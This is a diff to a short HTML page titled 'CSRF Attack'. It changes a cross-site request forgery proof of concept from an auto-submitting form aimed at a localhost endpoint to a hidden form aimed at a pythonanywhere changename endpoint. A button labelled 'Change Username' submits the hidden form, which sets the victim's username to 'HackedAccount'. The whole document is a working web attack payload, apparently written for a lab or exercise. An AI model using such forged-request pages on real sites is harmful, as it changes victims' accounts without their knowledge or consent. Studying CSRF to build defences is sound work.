@@ -6,11 +6,18 @@
     <title>CSRF Attack</title>
 </head>
 <body>
-    <form action="http://127.0.0.1:5000/change_username" method="post">
+    <button id="csrfButton">Change Username</button>
+    
+    <form id="csrfForm" action="https://goodweb.pythonanywhere.com/changename" method="post" style="display:none;">
         <input type="hidden" name="new_username" value="HackedAccount">
-        <script>
-            document.forms[0].submit();  // Auto-submit form
-        </script>
     </form>
+
+    <script>
+        // Add an event listener to the button
+        document.getElementById('csrfButton').onclick = function() {
+            // Submit the hidden form when the button is clicked
+            document.getElementById('csrfForm').submit();
+        }
+    </script>
 </body>
 </html>
